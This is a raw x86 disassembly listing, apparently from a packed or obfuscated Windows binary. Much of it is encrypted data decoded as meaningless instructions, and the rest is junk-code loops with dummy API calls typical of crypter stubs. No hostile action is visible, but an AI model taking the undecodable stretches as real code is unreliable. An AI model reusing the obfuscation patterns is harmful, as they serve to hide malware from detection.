  4048a4:	shl    BYTE PTR [esp+ecx*2-0x641e5437],cl
  4048ab:	and    BYTE PTR [ebx+0x4],al
  4048ae:	mov    dl,0x11
  4048b0:	sbb    eax,0xa968972e
  4048b5:	loopne 0x404930
  4048b7:	dec    edx
  4048b8:	push   ds
  4048b9:	call   0xcb14:0xfe74e7a9
  4048c0:	mov    ah,0x4c
  4048c2:	jbe    0x404914
  4048c4:	(bad)  
  4048c5:	pop    ds
  4048c6:	push   esp
  4048c7:	mov    al,BYTE PTR [esi]
  4048c9:	mov    esi,0x34e2201b
  4048ce:	dec    edi
  4048cf:	mov    eax,ds:0x2b743388
  4048d4:	xchg   edx,eax
  4048d5:	mov    ss,WORD PTR [edi+0x9]
  4048d8:	aad    0x1c
  4048da:	mov    ebx,DWORD PTR [ecx+0x5d]
  4048dd:	test   al,0x10
  4048df:	ins    BYTE PTR es:[edi],dx
  4048e0:	out    dx,al
  4048e1:	jnp    0x404948
  4048e3:	es aas 
  4048e5:	sub    BYTE PTR [esi+0x5a],ch
  4048e8:	jg     0x4048c4
  4048ea:	es (bad) 
  4048ec:	addr16 aas 
  4048ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ef:	inc    ecx
  4048f0:	ins    BYTE PTR es:[edi],dx
  4048f1:	mov    ebp,esp
  4048f3:	in     al,0x5
  4048f5:	ds jnp 0x4048a7
  4048f8:	stc    
  4048f9:	repz pop ebp
  4048fb:	jg     0x404956
  4048fd:	ror    DWORD PTR [esi],1
  4048ff:	jecxz  0x4048cc
  404901:	popf   
  404902:	stos   BYTE PTR es:[edi],al
  404903:	lahf   
  404904:	fidivr DWORD PTR [edi-0x61]
  404907:	push   eax
  404908:	cld    
  404909:	repnz out dx,eax
  40490b:	fsub   DWORD PTR [ebp+0x3a943cbe]
  404911:	fcmovne st,st(4)
  404913:	sbb    bh,cl
  404915:	ficomp WORD PTR [edi+0x7c]
  404918:	mov    dh,0xfe
  40491a:	out    dx,al
  40491b:	call   0x7e0d8316
  404920:	mov    bl,0x95
  404922:	xchg   edi,eax
  404923:	adc    ch,al
  404925:	xor    al,0xaf
  404927:	dec    DWORD PTR ds:0x249b5ed4
  40492d:	pop    ebx
  40492e:	sub    eax,0x6e29f7ef
  404933:	loop   0x404970
  404935:	leave  
  404936:	test   al,0xc4
  404938:	ja     0x4049ac
  40493a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40493b:	pop    ebp
  40493c:	ins    BYTE PTR es:[edi],dx
  40493d:	xor    eax,0x3c4c8cba
  404942:	aaa    
  404943:	call   0x2e38:0xc4274774
  40494a:	fstp   QWORD PTR [ecx+ecx*4-0x5d]
  40494e:	sbb    dl,0xc4
  404951:	inc    eax
  404952:	jg     0x404957
  404954:	ficomp DWORD PTR [esp+ebx*4-0x4436243]
  40495b:	xchg   ebp,eax
  40495c:	jo     0x40496a
  40495e:	mov    WORD PTR gs:[esi+edx*2+0x5f1e5ebd],fs
  404966:	sub    ch,BYTE PTR [eax-0x553f8315]
  40496c:	addr16 mov dh,0x4c
  40496f:	xchg   edi,eax
  404970:	daa    
  404971:	push   ebp
  404972:	das    
  404973:	jp     0x40497d
  404975:	and    al,0xd2
  404977:	test   edi,0x540ffe20
  40497d:	(bad)  
  40497e:	scas   al,BYTE PTR es:[edi]
  40497f:	shl    BYTE PTR [ebp-0x6d],cl
  404982:	stc    
  404983:	pushf  
  404984:	mov    ds:0xa4d9fb91,al
  404989:	mov    ds:0xd2bf2a1a,eax
  40498e:	scas   al,BYTE PTR es:[edi]
  40498f:	ret    
  404990:	ds adc al,0x27
  404993:	fist   WORD PTR [edx]
  404995:	pusha  
  404996:	push   ebx
  404997:	lahf   
  404998:	pop    ds
  404999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40499a:	mov    cl,0x11
  40499c:	bound  ebx,QWORD PTR [edi]
  40499e:	imul   edx,DWORD PTR [ebp+ebp*2+0x4b46d095],0x45
  4049a6:	fsub   st(3),st
  4049a8:	stos   DWORD PTR es:[edi],eax
  4049a9:	mov    ss,WORD PTR [edi-0x5]
  4049ac:	imul   edi,eax,0x32526b14
  4049b2:	xchg   esp,eax
  4049b3:	mov    eax,ds:0x6fed361a
  4049b8:	in     eax,dx
  4049b9:	push   ebx
  4049ba:	(bad)  
  4049bb:	mov    al,BYTE PTR [esi-0x26e85204]
  4049c1:	pop    ds
  4049c2:	cwde   
  4049c3:	mov    cl,0xcf
  4049c5:	mov    ecx,0x5d0d308d
  4049ca:	mov    bl,0xd1
  4049cc:	push   ds
  4049cd:	and    DWORD PTR [ebx+0x1f],ecx
  4049d0:	fwait
  4049d1:	inc    ebp
  4049d2:	push   ebx
  4049d3:	jge    0x4049c5
  4049d5:	lods   eax,DWORD PTR ds:[esi]
  4049d6:	xchg   ebp,eax
  4049d7:	enter  0xc562,0x53
  4049db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049dc:	adc    BYTE PTR [ebx+0x65a9d1b6],dl
  4049e2:	mov    cl,0xcd
  4049e4:	addr16 mov bh,0xf9
  4049e7:	xchg   edi,eax
  4049e8:	adc    eax,0xf90028d6
  4049ed:	add    esp,esi
  4049ef:	arpl   WORD PTR [edx-0x28],ax
  4049f2:	lea    esp,[ebp+0x69e808a4]
  4049f8:	lock fistp QWORD PTR [eax-0x30]
  4049fc:	or     al,0xe7
  4049fe:	mov    BYTE PTR [ecx+0x6c],bl
  404a01:	jge    0x4049f5
  404a03:	mov    ebx,0xdb4aee76
  404a08:	jmp    0x404a29
  404a0a:	adc    DWORD PTR [ebx-0x695fb7e1],esp
  404a10:	push   0xe
  404a12:	and    ebp,DWORD PTR [esi-0x15]
  404a15:	dec    edi
  404a16:	add    edx,DWORD PTR [eax-0x7]
  404a19:	mov    WORD PTR [ecx-0x5c],ss
  404a1c:	(bad)  
  404a1d:	(bad)  
  404a1e:	leave  
  404a1f:	bound  eax,QWORD PTR [eax-0x639607b3]
  404a25:	mov    ds:0x6f4cbc79,al
  404a2a:	or     ah,BYTE PTR [esi-0x36]
  404a2d:	inc    esp
  404a2e:	or     eax,DWORD PTR [eax+ecx*8]
  404a31:	and    BYTE PTR [ebx],dh
  404a33:	pop    es
  404a34:	sbb    BYTE PTR [ecx+0x75a5afbf],cl
  404a3a:	(bad)  [ecx]
  404a3c:	fnstcw WORD PTR [esi+ebx*4+0x15]
  404a40:	sub    cl,ch
  404a42:	pop    ebp
  404a43:	ds add ecx,eax
  404a46:	mov    ecx,edi
  404a48:	out    0xc3,eax
  404a4a:	lahf   
  404a4b:	mov    cl,0x3a
  404a4d:	stos   BYTE PTR es:[edi],al
  404a4e:	sbb    al,0x16
  404a50:	lods   eax,DWORD PTR ds:[esi]
  404a51:	div    BYTE PTR [ecx]
  404a53:	jns    0x404aaa
  404a55:	pop    ebx
  404a56:	xchg   BYTE PTR [edi+edi*4],ch
  404a59:	lds    esp,FWORD PTR [esi-0x74]
  404a5c:	push   edi
  404a5d:	push   cs
  404a5e:	sbb    ecx,DWORD PTR [edi-0x5bf1e298]
  404a64:	stc    
  404a65:	dec    ecx
  404a66:	cmp    eax,0xeb93c8d3
  404a6b:	nop
  404a6c:	cwde   
  404a6d:	sbb    eax,0x5b5e5fce
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43383f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4337b7
  404a94:	and    DWORD PTR ds:0x433803,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43372b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43376b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43382b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4337c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4337c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4337c3,edi
  404adf:	cmp    DWORD PTR ds:0x4337c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4337c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4337c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4337c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4337c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0x3fe2ac0c]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	adc    eax,0xaf124737
  404b3e:	xor    esi,DWORD PTR [esp]
  404b41:	iret   
  404b42:	dec    edi
  404b43:	xor    al,BYTE PTR [eax+ebx*4]
  404b46:	mov    al,ds:0x4e65ed41
  404b4b:	pop    esi
  404b4c:	jbe    0x404b55
  404b4e:	pop    ds
  404b4f:	lods   al,BYTE PTR ds:[esi]
  404b50:	mov    ds:0x3ae57726,al
  404b55:	xor    esi,esp
  404b57:	aas    
  404b58:	pop    esi
  404b59:	dec    ebx
  404b5a:	(bad)  
  404b5b:	and    BYTE PTR [edi-0x495c1b8f],bl
  404b61:	lahf   
  404b62:	push   0x33c4dec4
  404b67:	or     ch,ch
  404b69:	std    
  404b6a:	arpl   WORD PTR [eax-0x54],bp
  404b6d:	pop    ebp
  404b6e:	jge    0x404ba3
  404b70:	sar    bh,0x3e
  404b73:	fcmovnb st,st(0)
  404b75:	inc    ecx
  404b76:	sbb    DWORD PTR [ebp+0x3530da2d],0x229d00fc
  404b80:	mov    eax,0xaa5ddc53
  404b85:	pop    ss
  404b86:	test   al,0x29
  404b88:	test   DWORD PTR [ecx],edx
  404b8a:	dec    ebx
  404b8b:	add    DWORD PTR [ebp+0x21],0x72
  404b8f:	jl     0x404b4d
  404b91:	mov    eax,0x1a9d3544
  404b96:	rol    BYTE PTR [ecx+0x28e9043c],0x4a
  404b9d:	dec    edi
  404b9e:	arpl   bx,bx
  404ba0:	mov    dl,0x60
  404ba2:	rol    BYTE PTR [edx-0x79],cl
  404ba5:	adc    bh,dh
  404ba7:	fwait
  404ba8:	push   ds
  404ba9:	cmp    eax,0x13f0d288
  404bae:	(bad)  
  404bb0:	sbb    ecx,esi
  404bb2:	ja     0x404ba6
  404bb4:	jp     0x404c0b
  404bb6:	push   esi
  404bb7:	adc    ecx,DWORD PTR [ecx]
  404bb9:	(bad)  
  404bba:	pop    ebp
  404bbb:	aad    0xf0
  404bbd:	adc    eax,0x997d99e7
  404bc2:	mov    ebx,0x2c4e7da
  404bc7:	push   es
  404bc8:	arpl   WORD PTR [ebp+0x2b],sp
  404bcb:	jo     0x404c36
  404bcd:	ss jo  0x404c19
  404bd0:	fistp  WORD PTR [esi-0x6d]
  404bd3:	dec    edx
  404bd4:	cmp    eax,0x26291928
  404bd9:	and    DWORD PTR ds:0xc49ffff8,edi
  404bdf:	jo     0x404c43
  404be1:	in     eax,0x68
  404be3:	and    al,0x5
  404be5:	push   ebp
  404be6:	into   
  404be7:	pusha  
  404be8:	mov    ecx,0x983b5d81
  404bed:	call   0x841ba574
  404bf2:	or     DWORD PTR [esi+ebp*8+0x952b0d2],0x44
  404bfa:	fdiv   QWORD PTR [ebx-0x5e]
  404bfd:	mov    al,ds:0x98608e17
  404c02:	add    DWORD PTR [ebx+0xa5ea4fb],edi
  404c08:	cmp    bl,BYTE PTR [esi+ebp*4-0x792b704a]
  404c0f:	mov    ah,0x21
  404c11:	lea    ebp,[eax-0xfc8cc2e]
  404c17:	sbb    esp,ebx
  404c19:	sbb    dh,BYTE PTR [ebp-0x777e4a48]
  404c1f:	push   edx
  404c20:	test   al,0xab
  404c22:	mov    ?,WORD PTR [esi-0x73faf4f5]
  404c28:	jae    0x404c4b
  404c2a:	adc    dh,BYTE PTR [esi+0x28a99130]
  404c30:	mov    dh,0xb8
  404c32:	ja     0x404bdb
  404c34:	push   0x34
  404c36:	rcl    BYTE PTR [esp+ecx*2],cl
  404c39:	bound  eax,QWORD PTR [edi-0x64703a40]
  404c3f:	jge    0x404c8d
  404c41:	add    DWORD PTR [eax],ecx
  404c43:	add    DWORD PTR [esi],esp
  404c45:	mov    esi,DWORD PTR [esi-0x2f]
  404c48:	shl    BYTE PTR [eax],1
  404c4a:	xchg   ebp,eax
  404c4b:	das    
  404c4c:	cmp    eax,0x1675f73d
  404c51:	std    
  404c52:	cli    
  404c53:	xor    ebx,edi
  404c55:	mov    ebp,0x536ac575
  404c5a:	pop    ss
  404c5b:	loopne 0x404cc3
  404c5d:	out    dx,al
  404c5e:	dec    ebx
  404c5f:	ja     0x404cce
  404c61:	dec    eax
  404c62:	aaa    
  404c63:	in     al,dx
  404c64:	adc    DWORD PTR [ebp-0x79],edx
  404c67:	or     edi,DWORD PTR [ebp-0x3d]
  404c6a:	pop    ss
  404c6b:	inc    edx
  404c6c:	div    BYTE PTR [edi-0x1b]
  404c6f:	or     ah,BYTE PTR [eax-0x772e63bf]
  404c75:	call   0x80c4:0x91ae5f8c
  404c7c:	(bad)  
  404c7d:	fistp  QWORD PTR [esi]
  404c7f:	arpl   WORD PTR [ecx-0x39],di
  404c82:	out    dx,al
  404c83:	js     0x404c58
  404c85:	int    0xa1
  404c87:	mov    ch,0xb8
  404c89:	sbb    eax,0xa7be0706
  404c8e:	mov    dh,0x17
  404c90:	and    eax,0x43ce9d00
  404c95:	cwde   
  404c96:	fwait
  404c97:	xor    eax,0x6cbfe440
  404c9c:	dec    esp
  404c9d:	mov    eax,0xb166ff04
  404ca2:	sub    BYTE PTR [ecx],cl
  404ca4:	mov    ebx,0xe202c6ca
  404ca9:	ja     0x404c46
  404cab:	inc    ebp
  404cac:	rcr    BYTE PTR [esi+ecx*4+0x6c2f67c8],1
  404cb3:	mov    bl,0xc0
  404cb5:	ja     0x404c3d
  404cb7:	ficom  WORD PTR [ecx-0x4f876a24]
  404cbd:	xor    eax,DWORD PTR [eax+ebp*2-0x6c]
  404cc1:	sbb    eax,0xa24970b7
  404cc6:	jae    0x404c8b
  404cc8:	aad    0x1b
  404cca:	scas   eax,DWORD PTR es:[edi]
  404ccb:	push   edx
  404ccc:	jle    0x404d0a
  404cce:	mov    bh,0x6c
  404cd0:	sbb    ebx,eax
  404cd2:	and    dh,ah
  404cd4:	repnz into 
  404cd6:	pop    esp
  404cd7:	or     eax,0x85b787a3
  404cdc:	out    0x5e,eax
  404cde:	icebp  
  404cdf:	pop    edx
  404ce0:	pusha  
  404ce1:	dec    eax
  404ce2:	add    DWORD PTR gs:[esi-0x7b],ebp
  404ce6:	shl    DWORD PTR [edx+0x6],cl
  404ce9:	mov    esi,0x797f1015
  404cee:	cmp    ebp,DWORD PTR [ebp-0x6f29a187]
  404cf4:	cdq    
  404cf5:	aaa    
  404cf6:	inc    dl
  404cf8:	cmc    
  404cf9:	je     0x404d66
  404cfb:	jmp    0x2120:0x6142fee1
  404d02:	aaa    
  404d03:	pop    es
  404d04:	(bad)  
  404d05:	ror    DWORD PTR [eax],cl
  404d07:	scas   al,BYTE PTR es:[edi]
  404d08:	push   edi
  404d09:	retf   
  404d0a:	aad    0x6c
  404d0c:	push   ds
  404d0d:	(bad)  
  404d0e:	jp     0x404d4b
  404d10:	test   BYTE PTR [ebx+esi*1-0x65],dh
  404d14:	cmp    dh,BYTE PTR [ebx+0x4]
  404d17:	jmp    0xed4162db
  404d1c:	cdq    
  404d1d:	loopne 0x404d26
  404d1f:	and    eax,ebx
  404d21:	cdq    
  404d22:	js     0x404d30
  404d24:	or     al,0x6d
  404d26:	dec    ecx
  404d27:	cwde   
  404d28:	push   ds
  404d29:	jne    0x404d89
  404d2b:	sub    ah,BYTE PTR [ebp+0x3b]
  404d2e:	out    dx,al
  404d2f:	dec    edi
  404d30:	hlt    
  404d31:	mov    ds:0x2ba3ae69,eax
  404d36:	shl    bl,cl
  404d38:	outs   dx,BYTE PTR ds:[esi]
  404d39:	enter  0x1220,0x8b
  404d3d:	dec    esp
  404d3e:	jl     0x404db3
  404d40:	ret    0x8e4f
  404d43:	dec    eax
  404d44:	icebp  
  404d45:	push   ds
  404d46:	rcl    BYTE PTR [esi-0x4],0x84
  404d4a:	pop    DWORD PTR [esi]
  404d4c:	fsub   QWORD PTR [edi-0x509d5154]
  404d52:	dec    esp
  404d53:	adc    DWORD PTR [ebx-0x6669acf],esi
  404d59:	stos   BYTE PTR es:[edi],al
  404d5a:	sahf   
  404d5b:	mov    bl,0x3f
  404d5d:	or     edx,DWORD PTR [eax+0x2aa3d0f4]
  404d63:	cwde   
  404d64:	sub    eax,0xc6091557
  404d69:	cmp    al,0x8d
  404d6b:	pop    esi
  404d6c:	push   0x9868a9ce
  404d71:	add    DWORD PTR [edx+0x31970854],ecx
  404d77:	dec    ebp
  404d78:	pop    ds
  404d79:	dec    ebp
  404d7a:	mov    ah,0x64
  404d7c:	push   0x1f35e643
  404d81:	sahf   
  404d82:	lds    ebp,FWORD PTR [esi]
  404d84:	icebp  
  404d85:	cdq    
  404d86:	shl    BYTE PTR [ebx],0xbf
  404d89:	ja     0x404da7
  404d8b:	stos   DWORD PTR es:[edi],eax
  404d8c:	repz ja 0x404d81
  404d8f:	out    0x62,al
  404d91:	fs push esp
  404d93:	xchg   DWORD PTR [esi+0x434a04be],esi
  404d99:	mov    eax,DWORD PTR [edx+0x18]
  404d9c:	ss push ebx
  404d9e:	mov    ebp,0xda4a3355
  404da3:	mov    ds:0xd8c3c050,eax
  404da8:	std    
  404da9:	aam    0xcf
  404dab:	(bad)  [esi+0x266a19fb]
  404db1:	or     bh,ah
  404db3:	mov    dl,BYTE PTR [ecx+ebx*4]
  404db6:	jl     0x404db9
  404db8:	pop    ecx
  404db9:	in     eax,dx
  404dba:	std    
  404dbb:	bswap  eax
  404dbd:	iret   
  404dbe:	sub    BYTE PTR [esi],0x7
  404dc1:	or     eax,0xa18ff218
  404dc6:	iret   
  404dc7:	test   dh,0x8e
  404dca:	xchg   DWORD PTR [edi],ebp
  404dcc:	fst    QWORD PTR [ecx+0x261244eb]
  404dd2:	out    0x90,al
  404dd4:	sbb    eax,0x3f34027a
  404dd9:	pop    ebp
  404dda:	pop    edx
  404ddb:	lock push 0xae73f6da
  404de1:	(bad)  
  404de2:	lods   al,BYTE PTR ds:[esi]
  404de3:	xchg   DWORD PTR [eax],edx
  404de5:	mov    cl,0x7d
  404de7:	add    ebp,DWORD PTR [ebx]
  404de9:	pop    ds
  404dea:	jne    0x404e54
  404dec:	pop    ss
  404ded:	jmp    0xe44a:0x9510b273
  404df4:	adc    esi,edx
  404df6:	loop   0x404e0d
  404df8:	jmp    0xcd5:0xf0f9db3
  404dff:	fimul  WORD PTR [ebp+0x7a]
  404e02:	leave  
  404e03:	mov    edx,0xfd6b5e68
  404e08:	sub    al,0x7a
  404e0a:	loope  0x404e37
  404e0c:	cmp    ebp,DWORD PTR [ebp-0x4f]
  404e0f:	lods   eax,DWORD PTR ds:[esi]
  404e10:	xor    eax,0x95460e5e
  404e15:	xor    al,0xac
  404e17:	dec    ebx
  404e18:	scas   eax,DWORD PTR es:[edi]
  404e19:	aaa    
  404e1a:	not    DWORD PTR [ebx-0xb]
  404e1d:	cwde   
  404e1e:	sub    edx,DWORD PTR [edi-0x7b]
  404e21:	stos   BYTE PTR es:[edi],al
  404e22:	jnp    0x404e76
  404e24:	add    DWORD PTR [ebx-0x4a],esp
  404e27:	mov    ebp,0x36165ea3
  404e2c:	sub    BYTE PTR ds:0xaf538441,dl
  404e32:	cmp    eax,0xb35fc29a
  404e37:	(bad)  
  404e38:	xchg   edi,eax
  404e39:	mov    ch,0xb3
  404e3b:	xor    al,0x6
  404e3d:	rol    DWORD PTR [ebp-0x725a677c],1
  404e43:	mov    esp,DWORD PTR ds:[ebx+0x55]
  404e47:	stos   DWORD PTR es:[edi],eax
  404e48:	loope  0x404e97
  404e4a:	add    DWORD PTR [ecx+eiz*8+0x7af350bb],esi
  404e51:	ficomp WORD PTR [ebx]
  404e53:	push   edi
  404e54:	pop    ebx
  404e55:	adc    dh,bh
  404e57:	xor    bh,bh
  404e59:	int3   
  404e5a:	pop    eax
  404e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e5c:	aaa    
  404e5d:	jno    0x404e8a
  404e5f:	idiv   BYTE PTR [esi]
  404e61:	jae    0x404df9
  404e63:	mul    DWORD PTR [eax+ecx*8+0x7f75d318]
  404e6a:	shr    BYTE PTR [edi-0x5cdf4ee2],1
  404e70:	cmp    al,BYTE PTR [ecx]
  404e72:	icebp  
  404e73:	pop    esp
  404e74:	repz adc BYTE PTR [ebx-0x2e7ef7ab],cl
  404e7b:	pop    ecx
  404e7c:	jae    0x404e7e
  404e7e:	add    BYTE PTR [ecx+0x54b8c045],cl
  404e84:	or     BYTE PTR [ecx+0x7],dl
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43371b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4337e7
  404e9e:	adc    DWORD PTR ds:0x43377f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4337eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4337eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4337eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4337eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4337eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4337eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4337eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4337eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43383f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4337eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4337bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43383b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43383b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43383b,edi
  404f40:	cmp    DWORD PTR ds:0x43383b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43383b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43383b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43383b,edi
  404f72:	cmp    DWORD PTR ds:0x43383b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433737,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433767,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4337ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43370f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433767
  404fc8:	and    DWORD PTR ds:0x433713,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4337e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43382f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433837,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4337ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433727,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433727
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433727,edi
  405039:	cmp    DWORD PTR ds:0x433727,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433727,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433727
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433727,edi
  405079:	cmp    DWORD PTR ds:0x433727,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4337ff
  40508e:	add    DWORD PTR ds:0x4337bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4337eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43383b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43383b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4337fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433727,0x4337b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43371f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4337eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4337ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4337ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4337ff,edx
  40512b:	cmp    DWORD PTR ds:0x4337ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4337ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4337eb,0x43376f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4337e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	and    cl,ah
  405186:	lock mov bl,0xf4
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x4051bf
  405191:	push   ecx
  405192:	mov    ds:0x611d3831,al
  405197:	mov    ah,BYTE PTR [edx+0x75]
  40519a:	and    al,0x32
  40519c:	or     DWORD PTR [edi+0x37],ebp
  40519f:	cmp    bl,BYTE PTR [edi]
  4051a1:	dec    esp
  4051a2:	ret    0x197a
  4051a5:	dec    ecx
  4051a6:	mov    ds:0x8349f4d1,al
  4051ab:	xor    bl,dh
  4051ad:	lock mov al,ds:0x12f964d1
  4051b3:	and    eax,0x6f41dad
  4051b8:	jae    0x4051c4
  4051ba:	mov    ?,WORD PTR ds:0x71ba27f1
  4051c0:	leave  
  4051c1:	sti    
  4051c2:	rcl    DWORD PTR [esi-0x53525e37],0x11
  4051c9:	icebp  
  4051ca:	fisttp DWORD PTR [esi+edi*4-0x3d]
  4051ce:	cli    
  4051cf:	cmp    eax,0xb5bed5aa
  4051d4:	adc    DWORD PTR [ebx],esi
  4051d6:	js     0x40523f
  4051d8:	cmp    eax,0x644455f2
  4051dd:	pop    esi
  4051de:	and    edx,edi
